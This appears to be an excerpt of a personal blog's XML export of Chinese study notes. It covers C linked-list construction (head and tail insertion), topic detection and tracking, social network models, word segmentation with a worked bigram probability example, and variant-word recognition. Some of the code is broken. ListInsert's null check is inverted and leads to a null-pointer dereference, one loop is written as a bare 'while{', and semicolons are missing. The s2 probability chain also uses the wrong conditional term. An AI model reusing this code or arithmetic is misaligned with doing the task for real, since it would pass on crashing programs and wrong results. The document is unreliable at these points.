class="comment">//内存不足分配失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//头结点之后暂时还没有结点</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    LinkList L;  <span class="comment">//声明一个指向单链表的指针L</span></span><br><span class="line">    <span class="comment">//初始化一个空表</span></span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="comment">//······</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220519170717022-16604473981371.png" alt></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *p;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    p = L;</span><br><span class="line">    <span class="keyword">while</span> (p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    LNode *s = (LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">    s-&gt;data = e;</span><br><span class="line">    s-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = s;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>&#123;</span><br><span class="line">    ListInsert(L,length+<span class="number">1</span>,e);</span><br><span class="line">    length++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<script type="math/tex; mode=display">
时间复杂度:O(n^2)</script><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//初始化空表</span></span><br><span class="line">    LNode *s,*r=L;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">        s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//在r结点之后插入元素x</span></span><br><span class="line">        s-&gt;data = x;</span><br><span class="line">        r-&gt;next=s;</span><br><span class="line">        r=s;                             <span class="comment">//永远保持r指向最后一个结点</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;                <span class="comment">//尾结点指针置空</span></span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/08/%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%9E%84%E9%80%A0/image-20220519172020891-16604474078162.png" alt></p>
<p>时间复杂度：O(n)</p>
<h4 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">		LNode *s;</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//创建头结点</span></span><br><span class="line">		L-&gt;next = <span class="literal">NULL</span>;                     <span class="comment">//初始化为空链表</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		<span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                     <span class="comment">//输入9999表示结束</span></span><br><span class="line">			s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">			s-&gt;data=x;</span><br><span class="line">			s-&gt;next=L-&gt;next</span><br><span class="line">			L-&gt;next=s;                     <span class="comment">//将新结点插入表中，L为头指针</span></span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（ps：L-&gt;next = NULL是为了避免以前遗留的脏数据）</p>
<p>应用：链表的逆置 </p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>链表</tag>
        <tag>线性表</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全——TDT</title>
    <url>/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>TDT和几种网络模型的学习以及对网络舆情的了解</p>
<span id="more"></span>
<h2 id="话题检测与跟踪-Topic-Detection-and-Tracking-（TDT）"><a href="#话题检测与跟踪-Topic-Detection-and-Tracking-（TDT）" class="headerlink" title="话题检测与跟踪 Topic Detection and Tracking （TDT）"></a>话题检测与跟踪 Topic Detection and Tracking （TDT）</h2><p>美国国际高级研究计划局（DARPA）于1996年发起倡议，主要用于没有人工干预的情况下自动判断新闻数据流的主题。实现在新闻报道流中发现和跟踪新事件，完成新闻报道边界的自动识别、锁定和发现突发性新闻话题、跟踪话题发生发展过程等相关任务。<br>现在也广泛应用于社交媒体领域</p>
<p><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183609784.png" alt></p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183627454.png" alt></p>
<h2 id="TDT的基本任务"><a href="#TDT的基本任务" class="headerlink" title="TDT的基本任务"></a>TDT的基本任务</h2><p>报道切分 SST，Story Segmentation<br>话题跟踪 TT, Topic Tracking<br>话题检测 TD, Topic Detection Task<br>首次报道检测 FST,First-Story Detection Task<br>关联检测 LDT, Link Detection Task</p>
<p><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183656535.png" alt></p>
<h2 id="社交网络结构分析与建模"><a href="#社交网络结构分析与建模" class="headerlink" title="社交网络结构分析与建模"></a>社交网络结构分析与建模</h2><p>社交网络模型许多概念来自于图论，本质上可视为一个由节点（人）和边（社交关系）组成的图。<br>——度（Degree）：节点的度定义为与该节点相连的边的数目。在有向图中，所有指向某节点的边的数量叫作该节点的入度，所有从该节点出发指向别的节点的边的数量叫作该节点的出度。网络平均度反应了网络的疏密程度，而通过度分布则可以刻画不同节点的重要性。</p>
<p>——网络密度（Density）：网络密度可以用于刻画节点间相互连边的密集程度，定义为网络中实际存在边数与可容纳边数上限的比值，常用来测量社交网络中社交关系的密集程度及演化趋势。</p>
<p>——聚类系数（Clustering Coefficient）：用于描述网络中与同一节点相连的节点间也互为相邻节点的程度。其用于刻画社交网络中一个人朋友们之间也互相是朋友的概率，反应了社交网络中的聚集性。</p>
<p>——介数（Betweeness）：为图中某节点承载整个图所有最短路径的数量，通常用来评价节点的重要程度，比如在连接不同社群之间的中介节点的介数相对于其他节点来说会非常大，也体现了其在社交网络信息传递中的重要程度。</p>
<h2 id="网络特性"><a href="#网络特性" class="headerlink" title="网络特性"></a>网络特性</h2><p>· 小世界现象 small world<br>——指地理位置相距遥远的人可能具有较短的社会关系间隔。<br>——1967年，哈佛大学教授Milgram的信件投递实验：六度分离理论<br>——1998年，Watts 和Strogatz 的《自然》文章《Collective Dynamics of “Small-World” Networks》。<br>——2011年 的Facebook 数据分析表明， Facebook 约7.2亿用户中任意两个用户间的平均路径长度仅为4.74，而这一指标在推特中为4.67。<br>——互联网的节点是各个路由器，连边则是连接各个路由器的光纤。在 1995~1999 年对于互联网网站及路由器层次都进行了计算，发现互联网的平均路径长度是 L= 4.0<br>——语言网络也是小世界网络。每一个单词是一个节点，两个单词相连接出现在一个句子中即为有连边。据计算，两个单词之间的平均距离是 d = 2~3 (Romaine, 1992)</p>
<p>· 无标度（scale-free）特性<br>——大多数真实的大规模社交网络都存在着大多数节点有少量边，少数节点有大量边的特点，其网络缺乏一个统一的衡量尺度而呈现出异质性。<br>——这种节点度分布不存在有限衡量分布范围的性质称为无标度。<br>——无标度网络表现出来的度分布特征为幂律分布，构成此类网络的无标度特性。<br><img src="/2022/08/06/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94TDT/image-20220611183851563.png" alt><br>· 无标度网络模型也称为BA模型</p>
<h2 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h2><p>· WS 模型：WS 模型即小世界模型，通过小世界模型生成的小世界网络是从规则网络向随机网络过渡的中间形态。<br>· BA 模型：BA模型考虑到现实网络中节点的幂律分布特性，生成无标度网络。<br>· 其他模型：森林火灾模型，Kronecker 模型，生产模型。</p>
<h2 id="网络舆情分析概述"><a href="#网络舆情分析概述" class="headerlink" title="网络舆情分析概述"></a>网络舆情分析概述</h2><h3 id="网络舆情"><a href="#网络舆情" class="headerlink" title="网络舆情"></a>网络舆情</h3><p>舆情指在一定的社会空间内，围绕中介性社会事项的发生、发展和变化，作为主体的民众对作为客体的国家管理者产生和持有的社会政治态度。如果把中间的一些定语省略掉，<strong>舆情就是民众的社会政治态度。</strong></p>
<h2 id="网络舆情分析的特点"><a href="#网络舆情分析的特点" class="headerlink" title="网络舆情分析的特点"></a>网络舆情分析的特点</h2><p>直接性：通过网络直接发表意见，传播迅速<br>随意性和多元化：网民可匿名发表观点，健康观点和灰色言论并存<br>突发性：网络快速传播的特性使关注焦点迅速成长为舆论热点<br>隐蔽性：虚拟网络空间中网民可以隐身发言<br>偏差性：网络舆情不等同于全民立场</p>
]]></content>
      <tags>
        <tag>信息内容安全</tag>
        <tag>TDT</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全——中文分词技术</title>
    <url>/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>基于词典、统计、理解的中文分词技术，以及N-Gram模型和变体词的学习</p>
<span id="more"></span>
<h1 id="中文分词技术特点"><a href="#中文分词技术特点" class="headerlink" title="中文分词技术特点"></a>中文分词技术特点</h1><p>中文是以字为基本书写单位，单个字往往不足以表达一个意思，通常认为词是表达语义的最小元素。因此须对中文字符串进行合理的切分。<br>特征粒度为词粒度远远好于字粒度，其大部分分类算法不考虑词序信息，基于字粒度的损失了过多的n-gram信息。</p>
<h2 id="基于词典方法"><a href="#基于词典方法" class="headerlink" title="基于词典方法"></a>基于词典方法</h2><p>优点是：分词过程是跟词典作比较，不需要大量的语料库、规则库，其算法简单、复杂性小、对算法作一定的预处理后分词速度较快；<br>缺点是：不能消除歧义、识别未登录词，对词典的依赖性比较大，若词典足够大，其效果会更加明显。</p>
<h2 id="基于统计方法"><a href="#基于统计方法" class="headerlink" title="基于统计方法"></a>基于统计方法</h2><p>优点是：由于是基于统计规律的，对未登录词的识别表现出了一定的优越性，不需要预设词典；<br>缺点是：需要一个足够大的语料库来统计训练，其正确性很大程度上依赖训练语料库的质量好坏，算法较为复杂，计算量大，周期长，但是都较为常见，处理速度一般。</p>
<h2 id="基于理解方法"><a href="#基于理解方法" class="headerlink" title="基于理解方法"></a>基于理解方法</h2><p>优点是：由于能理解字符串含义，对未登录词具有很强的识别能力，能很好的解决歧义问题，不需要词典及大量语料库训练；<br>缺点是：需要一个准确、完备的规则库，依赖性较强，效果好坏往往取决于规则库的完整性。算法比较复杂、实现技术难度较大，处理速度比较慢。</p>
<h2 id="语义特征提取"><a href="#语义特征提取" class="headerlink" title="语义特征提取"></a>语义特征提取</h2><h3 id="语义特征需具备如下特征"><a href="#语义特征需具备如下特征" class="headerlink" title="语义特征需具备如下特征"></a>语义特征需具备如下特征</h3><p>特征项要能确实标识文本内容</p>
<p>能够将目标文本与其他文本相区分</p>
<p>特征项的个数不能太多</p>
<p>特征项分离要比较容易实现</p>
<p><strong>根据语义级别由低到高来分，文本语义特征可分为：亚词级别、词级别、多词级别、语义级别和语用级别。其中，应用最为广泛的是词级别。</strong></p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611181558637.png" alt></p>
<h2 id="词级别语义特征"><a href="#词级别语义特征" class="headerlink" title="词级别语义特征"></a>词级别语义特征</h2><p>词特征可进行计算的因素有很多，最常用的有：词频词性。还有文档，词语长度，词语直径，首次出现位置</p>
<p><strong>词级别(WordLevel)以词作为基本语义特征。以单词作为基本语义特征在文本分类、信息检索系统中工作良好，是最常见的基本语义特征。</strong></p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611181758848.png" alt></p>
<h2 id="亚词级别语义特征"><a href="#亚词级别语义特征" class="headerlink" title="亚词级别语义特征"></a>亚词级别语义特征</h2><p>亚词级别(Sub-Word Level)也称为字素级别(Graphemic Level)。在英文中比词级别更低的文字组成单位是字母，在汉语中则是单字。</p>
<h2 id="多词级别语义特征"><a href="#多词级别语义特征" class="headerlink" title="多词级别语义特征"></a>多词级别语义特征</h2><p>多词级别 (Multi-Word Leve1) 指用多个词作为文本的特征项，多词可以比词级别表示更多的语义信息；<br>经常从统计角度根据词之间较高的同现频率(Co-OccurFrequency) 来选取特征项</p>
<h2 id="n元模型"><a href="#n元模型" class="headerlink" title="n元模型"></a>n元模型</h2><p>n元模型将文本表示为重叠的n个连续字母(对应汉语情况为单字)的序列作为特征项；<br>采用 n元模型时，需要考虑数值n的选择问题。</p>
<h2 id="语言模型：词袋模型"><a href="#语言模型：词袋模型" class="headerlink" title="语言模型：词袋模型"></a>语言模型：词袋模型</h2><p>将单词和句子表示为数字向量的形式，其中向量元素为句子中此单词在词袋表出现的次数。然后将数字向量输入分类器(例如Naive Bayes)，进而对输出进行预测。这种表示方式不考虑文法以及词的顺序。</p>
<p>例如以下两个句子：<br>John likes to watch movies. Mary likes movies too.<br>John also likes to watch football games.<br>基于以上两个句子，可以建构词袋表：[ “John”, “likes”, “to”, “watch”, “movies”, “also”, “football”, “games”, “Mary”, “too” ]<br>由于词袋表的长度为10，所以每个句子的数字向量表示长度也为10。下面是每个句子的向量表示形式：<br>[1, 2, 1, 1, 2, 0, 0, 0, 1, 1]<br>[1, 1, 1, 1, 0, 1, 1, 1, 0, 0]<br>优缺点都很明显<br>优点是基于频率统计方法，易于理解。缺点是它的假设(单词之间完全独立)过于强大，无法建立准确的模型。</p>
<h2 id="词的描述：one-hot表示"><a href="#词的描述：one-hot表示" class="headerlink" title="词的描述：one-hot表示"></a>词的描述：one-hot表示</h2><p>基于词袋模型，可以用向量描述一个词，其向量维度大小为整个词汇表的大小，对于每个具体的词汇表中的词，将对应的位置置为1。</p>
<p>例如，以下5词组成的词汇表，Queen的序号为2， 其词向量为(0,1,0,0,0)，而Woman的词向量为(0,0,0,1,0)。<br>上述编码，称为1-of-N 表示或者one hot representation(单热表示).<br>当然，单热编码的词的维度元素非0即1，且词之间彼此相互独立。<br>可能导致词向量维度巨大，表达效率不高<br>无法反映文本的有序性</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182222965.png" alt></p>
<h2 id="语言模型：N-Gram模型"><a href="#语言模型：N-Gram模型" class="headerlink" title="语言模型：N-Gram模型"></a>语言模型：N-Gram模型</h2><p>马尔可夫链规定：系统下一时刻的状态仅由当前状态决定，不依赖于以往的任何状态。即第t + 1个单词的发生概率表示为：<br>                                    <img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182315117.png" alt><br>因此，一个句子的概率可以表示为：<br>                                    <img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182346849.png" alt><br>同样地，马尔可夫假设可以推广到：系统下一时刻的状态仅由当前0个、1个、2个…n个状态决定。这就是N-gram model的N的意思：对下一时刻的状态设置当前状态的个数。下面分别给出了unigram（一元模型）和bigram（二元模型)的第t + 1个单词的发生概率：<br>                                    <img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182419447.png" alt><br>可以发现，N-Gram 模型在词袋的基础上，通过采用马尔科夫链的思想，减少了概率计算的复杂度，同时考虑了单词间的相关性。</p>
<h3 id="例：二元语言模型判断句子是否合理"><a href="#例：二元语言模型判断句子是否合理" class="headerlink" title="例：二元语言模型判断句子是否合理"></a>例：二元语言模型判断句子是否合理</h3><p>假设现在有一个语料库，我们统计了下面的一些词出现的数量</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182528334.png" alt></p>
<p>面的这些概率值作为已知条件：</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182602442.png" alt></p>
<p>下面这个表给出的是基于Bigram模型进行计数之结果</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182907750.png" alt></p>
<p>例如，其中第一行，第二列 表示给定前一个词是 “i” 时，当前词为“want”的情况一共出现了827次。据此，我们便可以算得相应的频率分布表如下</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611182919951-16604459634692.png" alt></p>
<p>以表中的p(eat|i)=0.0036这个概率值讲解，从上页的表中得出“i”一共出现了2533次，而其后出现eat的次数一共有9次，<br>p(eat|i)=p(i, eat)/p(i) = count(i,eat)/count(i) = 9/2533 = 0.0036</p>
<p>通过基于这个语料库来判断s1=“<s> i want english food</s>” 与s2 = “<s> want i english food</s>“哪个句子更合理.</p>
<p>首先来判断p(s1)<br>P(s1)=P(i|<s>)P(want|i)P(english|want)P(food|english)P(</s>|food)<br>        =0.25×0.33×0.0011×0.5×0.68=0.000031</p>
<p>再来求p(s2)<br>P(s2)=P(want|<s>)P(i|want)P(english|want)P(food|english)P(</s>|food)<br>        =0.25<em>0.0022</em>0.0011<em>0.5</em>0.68 = 0.00000002057</p>
<p>显然 0.00000002057&lt;0.000031,即 s1= “i want english food&lt;/s&gt;”更像人话。</p>
<h3 id="N-gram模型的一个常见应用：联想词"><a href="#N-gram模型的一个常见应用：联想词" class="headerlink" title="N-gram模型的一个常见应用：联想词"></a>N-gram模型的一个常见应用：联想词</h3><p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E6%8A%80%E6%9C%AF/image-20220611183043714-16604459715633.png" alt="image-20220611183043714" style="zoom: 50%;"></p>
<p>实际上是根据语言模型得出。假如使用的是二元语言模型预测下一个单词：<br>排序的过程就是依据概率：<br>    p(”不一样“|”我们”)&gt;p(”的爱“|”我们”)&gt;p(”相爱吧“|”我们”)&gt;…….&gt;p(“这一家”|”我们“)</p>
<p>这些概率值的求法和上面提到的完全一样，数据的来源可以是用户搜索的log</p>
<h2 id="网络信息内容过滤"><a href="#网络信息内容过滤" class="headerlink" title="网络信息内容过滤"></a>网络信息内容过滤</h2><p>根据用户的信息需求，运用一定的标准和工具，从大量的动态网络信息流中选取相关的信息或剔除不相关信息的过程。<br>相比于信息检索技术，网络信息过滤技术是一种更系统化的方法，用来从动态的信息流中抽取出符合个性化需求的信息<br>相比于传统的信息检索模式，信息过滤技术具有较高的可扩展性，能适应大规模用户群和海量信息<br>可以为用户提供及时、个性化的信息服务，具有了一定的智能和较高的自动化程度</p>
<h2 id="网络信息内容过滤的意义"><a href="#网络信息内容过滤的意义" class="headerlink" title="网络信息内容过滤的意义"></a>网络信息内容过滤的意义</h2><p>改善Internet信息查询技术的需要<br>个性化服务的基础<br>维护我国信息安全的迫切需要<br>信息中介（信息服务供应商）开展网络增值服务的手段</p>
<h2 id="变体词的出现及识别意义"><a href="#变体词的出现及识别意义" class="headerlink" title="变体词的出现及识别意义"></a>变体词的出现及识别意义</h2><p>变体词是网络语言作为一种不规范语言的显著特色, 人们往往出于避免审查、表达情感、讽刺、娱乐等需求将相对严肃、规范、敏感的词用相对不规范、不敏感的词来代替, 用来代替原来词的新词，从而形成变体词(Morph) 。<br>变体词和其对应的目标实体词分别在非规范文本和规范文本中共存, 甚至变体词会渗透到规范文本中。<br>——变体词使行文生动活泼, 相关事件、消息也传播得更加广泛。<br>——变体词通常是某种隐喻, 已不再是其表面字词的意义了, 从而使网络上文体与正式文本    (如新闻等)具有巨大的差异。<br>如何识别出这些变体词及其所对应的目标实体词，对于下游的自然语言处理技术具有重要的意义。</p>
<h2 id="变体词的生成规律"><a href="#变体词的生成规律" class="headerlink" title="变体词的生成规律"></a>变体词的生成规律</h2><p>变体词多采用同音异形异义词<br>——同音异形异义词在中文中十分普遍<br>——中文字数虽然很多, 但是语音是有限的。<br>       · 据统计中文中 80%的单语音字是有歧义的, 而且其中有一半对应 5 个以上的字。<br>利用中文的特点生成变体词。<br>——利用中文文字的拆分组合、翻译、昵称等手段来创建变体词。<br>利用深层语义信息、背景知识、特定事件等综合生成变体词</p>
<h2 id="变体词识别与规范化方法"><a href="#变体词识别与规范化方法" class="headerlink" title="变体词识别与规范化方法"></a>变体词识别与规范化方法</h2><p>基于规则的识别和规范化方法<br>——相关研究包括网络不良文本的过滤技术。<br>       · 传统的精确匹配、分类器等方法会由于变体词的出现，严重影响到过滤准确度。<br>——对变体词的处理,<br>       · 分析变体词的变体规则, 提取变体词的 bigram、词干等特征，实现对变体词的识别<br>       · 根据汉语的语音特点，建立语音映射模型, 基于语音的相似性度量实现对变体词的识别。</p>
<p>基于统计和规则的识别和规范化<br>——提取统计特征和基于规则的特征, 建立变体词与目标实体词之间的映射关系<br>——通过分类方法，基于上下文相似性和字面相似性实现对变体词的规范化</p>
<p>基于语义表示的识别和规范化方法<br>——给定一个变体词, 如果另一个词与之上下文相似, 则可以初步推断这个词很可能 就是变体词的目标实体词。<br>        · 根据一定时间窗口内变体词和目标实体词是相关;<br>        · 根据社交媒体的动态特性提取变体词和目标实体词的时空分布;<br>        · 对多个数据源数据进行对比分析;对用户的行为建模,用社交行为的相关性来辅助语义相似性测量。 </p>
<p>与其他应用的结合<br>——变体词的识别与规范化与下游的自然语言 处理任务实际上是相互影响相互作用的, 例如分词。可以将变体词任务与下游的任务结合起来, 形成一个闭环相互反馈相互提高。</p>
]]></content>
      <tags>
        <tag>信息内容安全</tag>
        <tag>中文分词技术</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全——网络媒体信息获取一般流程</title>
    <url>/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>网络媒体信息获取的四个部分的学习</p>
<span id="more"></span>
<h1 id="网络媒体信息获取一般流程"><a href="#网络媒体信息获取一般流程" class="headerlink" title="网络媒体信息获取一般流程"></a>网络媒体信息获取一般流程</h1><h2 id="理想的网络媒体信息获取流程"><a href="#理想的网络媒体信息获取流程" class="headerlink" title="理想的网络媒体信息获取流程"></a>理想的网络媒体信息获取流程</h2><p>——初始URL集合<br>——信息获取<br>——信息解析<br>——信息判重</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611180833529.png" alt></p>
<h2 id="初始URL集合"><a href="#初始URL集合" class="headerlink" title="初始URL集合"></a>初始URL集合</h2><p>最初由搜索引擎研究人员提出<br>维护相当数量初始URL集合<br>网页内嵌地址的递归操作<br>形象地称为信息“种子”集合</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611180901579.png" alt></p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181045951.png" alt="image-20220611181045951"></p>
<h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><p>待获取内容协议解析<br>向信息发布网站请求所需内容<br>接收来自网站的响应信息<br>传递给后续的信息解析模块</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181119832.png" alt></p>
<h2 id="信息内容解析"><a href="#信息内容解析" class="headerlink" title="信息内容解析"></a>信息内容解析</h2><p>提取发布信息的主体内容<br>维护与网络内容的关键字段<br>内容转交至信息判重模块<br>关键字段存入信息库</p>
<p><img src="/2022/08/05/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AA%92%E4%BD%93%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B/image-20220611181213532.png" alt></p>
